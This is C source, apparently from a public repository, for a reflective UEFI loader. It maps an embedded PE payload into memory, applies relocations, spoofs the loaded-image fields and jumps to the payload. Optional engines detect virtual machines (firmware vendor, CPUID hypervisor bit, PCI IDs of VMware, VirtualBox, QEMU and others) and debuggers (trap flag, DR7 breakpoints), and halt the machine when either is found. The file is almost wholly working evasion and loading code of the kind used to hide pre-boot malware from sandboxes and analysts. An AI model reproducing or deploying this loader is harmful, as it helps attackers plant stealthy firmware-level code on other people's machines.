/*=====================================*/
// [ OWNER ]
//     CREATOR  : Vladislav Khudash
//     AGE      : 17
//     LOCATION : Ukraine
//
// [ PINFO ]
//     DATE     : 02.08.2026
//     PROJECT  : REFLECTIVE-EFI-LOADER
//     PLATFORM : UEFI
/*=====================================*/




/* GitHub: https://github.com/vk-candpython/efildr


REQUIREMENTS (
    Сompiler : GCC (GNU-EFI)
    Support  : UEFI (PE32+)
)


https://github.com/vk-candpython/efildr/blob/main/loader.h

INTERNAL LOADER DECLARATIONS */
#include "loader.h"
#include "payload.h"



/* Compile-time validation of feature flags */

#define _FLAG_IS_BOOLEAN(flg) _Static_assert(              \
    ((flg) == 0) || ((flg) == 1),                          \
    "Build flag: '" #flg "', must be either (0) or (1)"    \
)


_FLAG_IS_BOOLEAN(  USING_ANTI_VM           );
_FLAG_IS_BOOLEAN(  USING_ANTI_DEBUG        );
_FLAG_IS_BOOLEAN(  USING_ERASE_PE_HEADERS  );


#undef _FLAG_IS_BOOLEAN




/* Terminate current process with error string,
   Uses only in LOADER-ENTRY-POINT
   (_ErrorExitString & _exit) */
#define LDR_EXIT(ErrStr16) do {              \
    _ErrorExitString = (CHAR16*)ErrStr16;    \
    goto _exit;                              \
} while (0)




/* Copy PE image data into allocated memory */
DEC_FUNC(VOID) CopyImageData(
    RESTR_PTR(VOID) const         img,
    RESTR_PTR(VOID) const         buf,
    CONST_PTR(IMAGE_NT_HEADERS64) hdNt
) {
    /* Copy PE headers */
    MEMCPY(img, buf, hdNt->OptionalHeader.SizeOfHeaders);


    const IMAGE_SECTION_HEADER *sn =
        IMAGE_FIRST_SECTION(hdNt);

    CONST_PTR(IMAGE_SECTION_HEADER) se =
        sn + hdNt->FileHeader.NumberOfSections;

    /* Copy each section */
    FOR_LIKE (,  sn < se,  sn++) {
        const UINT32 vrSz = sn->Misc.VirtualSize,
                     rwSz = sn->SizeOfRawData;

        /* Skip virtual-only sections
           with no data */
        IF_UNLIKE (!vrSz) continue;


        VOID const     *dst = RVA(VOID*, img, sn->VirtualAddress  );
        CONST_PTR(VOID) src = RVA(VOID*, buf, sn->PointerToRawData);
        const UINT32    sz  = MIN(vrSz, rwSz);


        /* Copy section data to image */
        IF_LIKE (sz) MEMCPY(dst, src, sz);

        /* Zero out the rest of the section */
        IF_UNLIKE (vrSz > rwSz) ZEROS((UINT8*)dst + rwSz, vrSz - rwSz);
    }
}




/* Apply base relocations to the mapped image */
DEC_FUNC(VOID) ApplyImageRelocations(
    VOID const                        *img,
    CONST_PTR(IMAGE_OPTIONAL_HEADER64) hdOpt
) {
    /* Relocation delta actual
       load address offset from ImageBase */
    const UINT64 dlt = (UINT64)img - hdOpt->ImageBase;


    CONST_PTR(IMAGE_DATA_DIRECTORY) ldr =
        &hdOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    /* Skip if no base relocation table is present */
    IF_UNLIKE (!ldr->VirtualAddress) return;


    const IMAGE_BASE_RELOCATION *rl =
        RVA(IMAGE_BASE_RELOCATION*, img, ldr->VirtualAddress);

    CONST_PTR(IMAGE_BASE_RELOCATION) rlEnd =
        RVA(IMAGE_BASE_RELOCATION*, rl, ldr->Size);


    /* Process each relocation block */
    WHILE_LIKE (rl < rlEnd) {
        UINT8 const      *blkVA = RVA(UINT8*, img, rl->VirtualAddress);
        const UINT16     *it    = (UINT16*)(rl + 1);
        CONST_PTR(UINT16) itEnd = it + RELOC_ENTRY_COUNT(rl);


        /* Apply all fixups in this block */
        FOR_LIKE (,  it < itEnd,  it++) {
            const UINT16 entry = *it;

            IF_LIKE (RELOC_IS_DIR64(entry)) {
                const UINT32 ofs = RELOC_BLOCK_OFFSET(entry);
                *(UINT64*)(blkVA + ofs) += dlt;
            }
        }


        /* Advance to next relocation block */
        rl = RVA(IMAGE_BASE_RELOCATION*, rl, rl->SizeOfBlock);
    }
}






/* Finds a case-insensitive ASCII substring in a CHAR16 string */
DEC_FUNC(BOOLEAN) FindSubString(const RESTR_PTR(CHAR16) String,
                                const RESTR_PTR(CHAR16) SubString) {
    IF_UNLIKE (!(String && SubString)) return FALSE;

    const CHAR16 first = ASCII_TOLOWER(*SubString);
    IF_UNLIKE (!first) return TRUE;


    WHILE_LIKE (*String++) {
        /* Skip until the first character matches */
        IF_LIKE (ASCII_TOLOWER(String[-1]) != first)
            continue;

        const CHAR16 *s = String;
        const CHAR16 *p = SubString + 1;

        /* Compare the remaining characters */
        WHILE_LIKE (TRUE) {
            const CHAR16 a = *s;
            const CHAR16 b = *p;

            IF_UNLIKE (!(a && b) || (ASCII_TOLOWER(a) != ASCII_TOLOWER(b)))
                break;

            ++s, ++p;
        }

        /* Full substring matched */
        IF_LIKE (!*p) return TRUE;
    }

    return FALSE;
}




/* Anti-VM Engine:
   Returns TRUE if virtual machine is DETECTED */
#if (USING_ANTI_VM)
DEC_FUNC(BOOLEAN) AntiVM(CONST_PTR(VOID) ImageHandle) {
    BOOLEAN is_VM = TRUE;
    EFI_HANDLE *hBuffer = NULL;

{//* FIRMWARE-VENDOR
    CONST_PTR(CHAR16) FirmwareVendor = ST->FirmwareVendor;

    CONST_PTR(CHAR16) ven[] = IBV_FIRMWARE_VENDORS;
    const UINT8 venSz = sizeof(ven) / sizeof(*ven);


    BOOLEAN is_IBV = FALSE;

    FOR_LIKE (UINT8 i = 0,  !is_IBV && (i < venSz),  i++)
        is_IBV = FindSubString(FirmwareVendor, ven[i]);

    /* Firmware vendor not matched */
    IF_UNLIKE (!is_IBV) goto _ret;
}//* FIRMWARE-VENDOR

{//* CPUID
    BOOLEAN hypervisor;

    DEC_ASM (
        "movl $1, %%eax\n\t" // 1. Set CPUID function 1 (Processor Info)
        "cpuid\n\t"          // 2. Execute CPUID (fills EAX, EBX, ECX, EDX)
        "btl $31, %%ecx\n\t" // 3. Bit test bit 31 (Hypervisor Present Bit)

        : "=@ccc"(hypervisor)
        : : "rax", "rbx", "rcx", "rdx"
    );

    IF_UNLIKE (hypervisor) goto _ret;
}//* CPUID

{//* PCIVEN
    EFI_GUID PciIoGuid = EFI_PCI_IO_PROTOCOL_GUID;
    UINTN    hCount    = 0;

    /* Assume VM if PCI I/O handles are not enumerable */
    IF_EFIFAIL (LibLocateHandle(ByProtocol, &PciIoGuid,
                                NULL, &hCount, &hBuffer)
    ) goto _ret;


    UINT16 vendorID;

    FOR_LIKE (UINTN i = 0,  i < hCount,  i++) {
        EFI_PCI_IO_PROTOCOL *pciIo = NULL;

        /* Open the PCI I/O protocol for each device handle */
        IF_EFIFAIL (EFI_CALL(BS->OpenProtocol,
            hBuffer[i], &PciIoGuid, (VOID**)&pciIo,
            ImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL
        )) continue;

        /* Read Vendor ID (offset 0) from PCI config space */
        IF_EFIFAIL (EFI_CALL(pciIo->Pci.Read,
            pciIo, EfiPciIoWidthUint16, 0, 1, &vendorID
        )) continue;


        /* Match known VM vendor IDs */
        switch (vendorID) {
            case PCI_VENID_VBOX      :
            case PCI_VENID_VMWARE    :

            case PCI_VENID_QEMU      :
            case PCI_VENID_QEMU_BRG  :
            case PCI_VENID_QEMU_VGA  :

            case PCI_VENID_XEN       :
            case PCI_VENID_HYPER_V   :
            case PCI_VENID_PARALLELS :
            /* VM vendor is detected */
                goto _ret;
        }
    }
}//* PCIVEN

/* VM is not detected */
is_VM = FALSE;

_ret:
    IF_LIKE (hBuffer) FreePool(hBuffer);
    return is_VM;
}
#endif




/* Anti-Debug Engine:
   Returns TRUE if debug/anomaly is DETECTED */
#if (USING_ANTI_DEBUG)
DEC_FUNC(BOOLEAN) AntiDebug(VOID) {
    BOOLEAN is_DEBUG = TRUE;
    UINT64  flg;


    /* Check for single-step trap flag */
    DEC_ASM ("pushfq ; popq %0\n\t" : "=r"(flg));

    /* Trap Flag (TF) is set */
    IF_UNLIKE (flg & CPU_RFLAGS_TF) goto _ret;


    /* Check for enabled hardware breakpoints */
    DEC_ASM ("movq %%dr7, %0\n\t" : "=r"(flg));

    /* Any hardware breakpoint is enabled */
    IF_UNLIKE (flg & CPU_DR7_BP_MASK) goto _ret;


/* DEBUGGER is not detected */
is_DEBUG = FALSE;

_ret:
    return is_DEBUG;
}
#endif


#if (USING_ANTI_DEBUG)
    #define _ANTITRAP() do {            \
        IF_UNLIKE (AntiDebug())         \
            LDR_EXIT(LDR_ERR_DEBUG);    \
    } while (0)
#else
    #define _ANTITRAP() ((VOID)0)
#endif




/*
/==================\
 LOADER-ENTRY-POINT
/==================\
*/
EFI_STATUS EFIAPI efi_main(
    EFI_HANDLE        ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable
) { CHAR16           *_ErrorExitString = NULL;
_ANTITRAP();
    VOID  *img;
    UINT64 AddrOfEntryPoint;

    InitializeLib(ImageHandle, SystemTable);
_ANTITRAP();


#if (USING_ANTI_VM)
    IF_UNLIKE (AntiVM(ImageHandle))
        LDR_EXIT(LDR_ERR_VM);
_ANTITRAP();
#endif



    CONST_PTR(IMAGE_NT_HEADERS64) hdNt =
        RVA(IMAGE_NT_HEADERS64*, buf, DOS_LFANEW(buf));

    CONST_PTR(IMAGE_OPTIONAL_HEADER64) hdOpt =
        &hdNt->OptionalHeader;


{//* ALLOCATE IMAGE
_ANTITRAP();
    EFI_PHYSICAL_ADDRESS imgAddr = 0;
    UINTN imgSize = (UINTN)EFI_SIZE_TO_PAGES(hdOpt->SizeOfImage);

    IF_EFIFAIL (EFI_CALL(BS->AllocatePages,
        AllocateAnyPages, EfiLoaderCode,
        imgSize, &imgAddr
    )) LDR_EXIT(LDR_ERR_ALLOC_IMAGE);

    img = (VOID*)imgAddr;
_ANTITRAP();
}//* ALLOCATE IMAGE


    CopyImageData(img, buf, hdNt);
_ANTITRAP();
    ApplyImageRelocations(img, hdOpt);


    AddrOfEntryPoint = RVA(UINT64, img, hdOpt->AddressOfEntryPoint);


_ANTITRAP();
    EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;

    IF_EFIFAIL (EFI_CALL(BS->HandleProtocol,
        ImageHandle, &gEfiLoadedImageProtocolGuid,
        (VOID**)&LoadedImage
    )) LDR_EXIT(LDR_ERR_LOADED_IMAGE);

    LoadedImage->ImageBase = img;
    LoadedImage->ImageSize = hdOpt->SizeOfImage;
_ANTITRAP();



    /* Transfer control to the loaded executable */
    DEC_ASM (
        "movq %0, %%rax\n\t"   // Move entry point address
        "movq %1, %%rcx\n\t"   // ImageHandle (1st argument)
        "movq %2, %%rdx\n\t"   // SystemTable (2nd argument)

        "andq $-16, %%rsp\n\t" // Align stack to 16-byte boundary
        "subq $40,  %%rsp\n\t" // Reserve 32-byte shadow space + 8 for alignment

        "jmpq *%%rax\n\t"      // Jump to the loaded image entry point

        : : "r"(AddrOfEntryPoint), "r"(ImageHandle), "r"(SystemTable)
        : "memory", "cc", "rax", "rcx", "rdx"
    );



_exit:
    /* Set error text color */
    EFI_CALL(SystemTable->ConOut->SetAttribute,
        SystemTable->ConOut, EFI_BACKGROUND_BLACK|EFI_LIGHTRED);


    /* Display error message */
    IF_LIKE (_ErrorExitString) {
        EFI_CALL(SystemTable->ConOut->OutputString,
            SystemTable->ConOut, LDR_ERR_PREFIX);

        EFI_CALL(SystemTable->ConOut->OutputString,
            SystemTable->ConOut, _ErrorExitString);
    }


    /* Stop execution permanently */
    DEC_ASM ("cli"); WHILE_LIKE (TRUE) DEC_ASM ("hlt");
    return EFI_LOAD_ERROR;
}
